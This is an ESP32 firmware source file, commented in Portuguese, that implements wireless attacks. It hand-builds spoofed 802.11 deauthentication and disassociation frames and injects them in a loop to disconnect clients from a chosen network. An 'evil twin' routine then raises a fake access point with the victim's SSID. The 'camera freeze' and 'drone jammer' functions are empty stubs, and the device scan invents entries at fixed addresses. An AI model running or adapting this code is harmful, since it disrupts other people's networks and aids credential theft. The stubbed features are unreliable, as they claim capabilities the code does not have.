#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"

// ============================================================
// DEAUTH / DISASSOC FRAMES
// ============================================================

// Deauth: AP -> Broadcast
static uint8_t deauthFrame[26] = {
    0xC0, 0x00,             // Frame Control: Deauth
    0x3A, 0x01,             // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: Broadcast [4]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC [10]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
    0x00, 0x00,             // Seq Ctrl [22] - DRIVER INCREMENTA
    0x01, 0x00              // Reason: 1 = Unspecified [24]
};

// Deauth: AP -> STA (direcionado)
static uint8_t deauthFrameToSTA[26] = {
    0xC0, 0x00,
    0x3A, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA: STA MAC [4]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC [10]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
    0x00, 0x00,
    0x01, 0x00
};

// Deauth: STA -> AP (reverso)
static uint8_t deauthFrameFromSTA[26] = {
    0xC0, 0x00,
    0x3A, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA: AP MAC [4]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: STA MAC [10] 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
    0x00, 0x00,
    0x01, 0x00
};

// Disassociation: AP -> Broadcast
static uint8_t disassocFrame[26] = {
    0xA0, 0x00,             // Frame Control: Disassociation
    0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00
};

// ============================================================
// CONTADORES E ESTADO
// ============================================================
static uint32_t deauthPacketCount = 0;
static uint32_t deauthSuccessCount = 0;
static uint8_t  deauthTargetChannel = 0;
static uint8_t  deauthTargetBSSID[6] = {0};
static char     deauthTargetSSID[33] = {0};
static uint8_t  deauthTargetAuth = 0;
static uint32_t deauthFailCount = 0;
static esp_err_t lastDeauthError = ESP_OK;

// ============================================================
// HELPERS
// ============================================================
void setMAC(uint8_t* frame, uint8_t* mac, int offset) {
    memcpy(&frame[offset], mac, 6);
}

// ============================================================
// SCAN WIFI
// ============================================================
void scanNetworks() {
    networkCount = 0;

    // MODO CRÍTICO: NÃO desconecta completamente!
    // Apenas garante modo STA - interface deve permanecer ativa
    if (WiFi.getMode() != WIFI_STA) {
        WiFi.mode(WIFI_STA);
    }
    // NÃO chama WiFi.disconnect(true) aqui - isso invalida a interface!
    delay(100);

    int n = WiFi.scanNetworks(false, true);
    Serial.printf("[WiFi] Scan found %d networks\n", n);

    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
        strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 32);
        scannedNetworks[i].ssid[32] = '\0';
        memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
        scannedNetworks[i].rssi = WiFi.RSSI(i);
        scannedNetworks[i].channel = WiFi.channel(i);
        scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        Serial.printf("[WiFi] %d: %s CH%d RSSI%d\n",
            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi);
        networkCount++;
    }
    WiFi.scanDelete();
}

uint8_t getNetworkCount() { return networkCount; }

NetworkInfo* getNetwork(uint8_t index) {
    if (index < networkCount) return &scannedNetworks[index];
    return nullptr;
}

// ============================================================
// DEAUTH
// ============================================================
void startDeauth(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Deauth] ERROR: invalid network index");
        return;
    }

    NetworkInfo* target = &scannedNetworks[networkIndex];

    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    deauthTargetAuth = target->encrypted ? 1 : 0;

    // Configura frames com MAC do AP
    setMAC(deauthFrame, target->bssid, 10);
    setMAC(deauthFrame, target->bssid, 16);

    setMAC(deauthFrameToSTA, target->bssid, 10);
    setMAC(deauthFrameToSTA, target->bssid, 16);

    setMAC(deauthFrameFromSTA, target->bssid, 4);   // DA = AP
    setMAC(deauthFrameFromSTA, target->bssid, 16);  // BSSID = AP
    setMAC(deauthFrameFromSTA, target->bssid, 10);  // SA = AP (spoof)

    setMAC(disassocFrame, target->bssid, 10);
    setMAC(disassocFrame, target->bssid, 16);

    // === PREPARA WIFI - ORDEM CRÍTICA ===
    // 1. Modo STA (interface já deve estar ativa)
    WiFi.mode(WIFI_STA);
    delay(50);

    // 2. NÃO desconecta! A interface STA precisa estar "up"
    //    para esp_wifi_80211_tx funcionar.
    //    WiFi.disconnect(true) DESTRÓI a interface!
    //    Apenas garante que não estamos conectados a nenhum AP
    if (WiFi.status() == WL_CONNECTED) {
        WiFi.disconnect(false);  // false = não apaga configuração da interface
        delay(100);
    }

    // 3. Desliga power save para TX máximo
    esp_wifi_set_ps(WIFI_PS_NONE);

    // 4. MUDA PARA O CANAL DO ALVO
    esp_err_t chErr = esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[Deauth] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
        target->ssid, target->channel,
        target->bssid[0], target->bssid[1], target->bssid[2],
        target->bssid[3], target->bssid[4], target->bssid[5]);
    Serial.printf("[Deauth] Set channel result: %d\n", chErr);

    // 5. Promiscuous mode APÓS configurar tudo
    //    (algumas versões do driver precisam disso)
    esp_wifi_set_promiscuous(true);
    delay(50);

    // Reseta contadores
    deauthActive = true;
    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    deauthFailCount = 0;
    lastDeauthError = ESP_OK;

    Serial.println("[Deauth] STARTED");
}

void stopDeauth() { 
    if (deauthActive) {
        Serial.println("[Deauth] STOPPED");
        Serial.printf("[Deauth] Total: %lu pkts, %lu success, %lu failed\n",
            deauthPacketCount, deauthSuccessCount, deauthFailCount);
    }
    deauthActive = false;
    esp_wifi_set_promiscuous(false);
}

// ============================================================
// LOOP DE DEAUTH
// ============================================================
bool deauthLoop() {
    if (!deauthActive) return false;

    static uint8_t cycle = 0;
    bool anySuccess = false;
    esp_err_t err = ESP_FAIL;

    // Verifica se a interface ainda está válida
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode != WIFI_MODE_STA) {
        Serial.printf("[Deauth] WARN: WiFi mode=%d, resetting to STA\n", mode);
        WiFi.mode(WIFI_STA);
        delay(50);
    }

    // Alterna entre 4 tipos de frames
    switch (cycle % 4) {
        case 0:
            err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, true);
            break;
        case 1:
            err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameToSTA, 26, true);
            break;
        case 2:
            err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameFromSTA, 26, true);
            break;
        case 3:
            err = esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, 26, true);
            break;
    }
    cycle++;

    if (err == ESP_OK) {
        deauthSuccessCount++;
        anySuccess = true;
    } else {
        lastDeauthError = err;
        deauthFailCount++;
        // Loga erros para debug
        if (deauthFailCount <= 10 || deauthFailCount % 50 == 0) {
            Serial.printf("[Deauth] TX ERR cycle=%d err=%d (%s)\n", 
                cycle % 4, err, 
                err == ESP_ERR_WIFI_IF ? "invalid interface" :
                err == ESP_ERR_INVALID_ARG ? "invalid arg" :
                err == ESP_ERR_WIFI_TIMEOUT ? "timeout" : "unknown");
        }
    }
    deauthPacketCount++;

    // Debug a cada ~2 segundos
    static uint32_t lastDebug = 0;
    if (millis() - lastDebug > 2000) {
        lastDebug = millis();
        float rate = (deauthPacketCount > 0) ? 
            ((float)deauthSuccessCount / deauthPacketCount * 100.0) : 0;
        Serial.printf("[Deauth] pkt=%lu succ=%lu fail=%lu rate=%.1f%% ch=%d\n",
            deauthPacketCount, deauthSuccessCount, deauthFailCount, 
            rate, deauthTargetChannel);
    }

    return anySuccess;
}

// ============================================================
// GETTERS
// ============================================================
uint32_t getDeauthPacketCount() { return deauthPacketCount; }
uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
uint8_t  getDeauthSuccessPercent() {
    if (deauthPacketCount == 0) return 0;
    return (uint8_t)((deauthSuccessCount * 100) / deauthPacketCount);
}
const char* getDeauthTargetSSID() { return deauthTargetSSID; }
uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }

// ============================================================
// FAKE AP / EVIL TWIN
// ============================================================
void startFakeAP(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "12345678");
    fakeAPEnabled = true;
    passwordCaptured = false;
}

void stopFakeAP() {
    WiFi.softAPdisconnect(true);
    fakeAPEnabled = false;
}

bool isFakeAPActive() { return fakeAPEnabled; }

void startEvilTwin(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;
    startDeauth(networkIndex);
    delay(3000);
    stopDeauth();
    startFakeAP(scannedNetworks[networkIndex].ssid);
}

// ============================================================
// REMOTE DEVICES
// ============================================================
void scanRemoteDevices() {
    remoteDeviceCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
        if (i % 50 == 0) {
            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d",
                     gateway[0], gateway[1], gateway[2], i);
            snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
            remoteDevices[remoteDeviceCount].port = 80;
            remoteDeviceCount++;
        }
    }
}

uint8_t getRemoteDeviceCount() { return remoteDeviceCount; }

RemoteDevice* getRemoteDevice(uint8_t index) {
    if (index < remoteDeviceCount) return &remoteDevices[index];
    return nullptr;
}

// ============================================================
// CAMERA FREEZE / DRONE
// ============================================================
void startCameraFreeze() {
    cameraFreezeActive = true;
    while (cameraFreezeActive) {
        delay(50);
        yield();
    }
}

void stopCameraFreeze() { cameraFreezeActive = false; }

void startDroneJammer() {
    droneJammerActive = true;
    while (droneJammerActive) {
        delay(10);
        yield();
    }
}

void stopDroneJammer() { droneJammerActive = false; }

struct DroneLocation {
    float distance;
    int8_t rssi;
};

DroneLocation droneLoc;

void startDroneLocate() {
    droneLoc.distance = 0;
    droneLoc.rssi = -50;
}

DroneLocation* getDroneLocation() { return &droneLoc; }
